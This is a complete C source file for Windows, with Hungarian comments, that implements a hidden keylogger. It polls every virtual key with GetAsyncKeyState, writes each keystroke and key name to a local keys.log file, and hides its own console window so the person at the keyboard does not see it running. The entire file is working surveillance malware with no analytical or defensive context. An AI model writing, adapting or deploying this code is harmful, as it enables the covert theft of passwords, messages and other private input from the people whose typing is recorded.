#include <stdio.h>
#include <windows.h>

void startLogging(){
    short vKey, l, code;
    char keyName[20];
    FILE *fp;
    while(1){
        for(vKey=8;vKey<256;vKey++){
            if(GetAsyncKeyState(vKey)==-32767){
                if(!(fp=fopen("keys.log","a+"))) return;
                if(vKey==VK_SPACE){ //a szokozoket beleirjuk
                    fputc(' ',fp);
                    fclose(fp);
                    continue;
                }
                code=MapVirtualKeyEx(vKey,0,GetKeyboardLayout(0));
                if((vKey==VK_PRIOR)||(vKey==VK_NEXT)||(vKey==VK_INSERT)||(vKey==VK_DELETE)||(vKey==VK_LEFT)||
                   (vKey==VK_RIGHT)||(vKey==VK_DOWN)||(vKey==VK_UP)||(vKey==VK_NUMLOCK)||(vKey==VK_DIVIDE)) code|=0x100;
                l=GetKeyNameText(code<<16,keyName+1,sizeof(keyName))+1;
                if(l==2){ //ha karakter, akkor siman kiirjuk
                    fputs(keyName+1,fp);
                }
                else{ //kulonben [ ] koze irjuk a billentyu a nevet
                    keyName[0]='[';
                    keyName[l]=']';
                    keyName[l+1]='\0';
                    fputs(keyName,fp);
                }
                fclose(fp); //mindig bezarjuk a fajlt, hogy futas kozben is szerkesztheto legyen
            }
        }
        Sleep(10);
    }
}

int main(){
    HWND win;
    AllocConsole();
    win=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(win,0); //nem mutatjuk az ablakot
    startLogging(); //ez sosem ter vissza
    return 0;
}
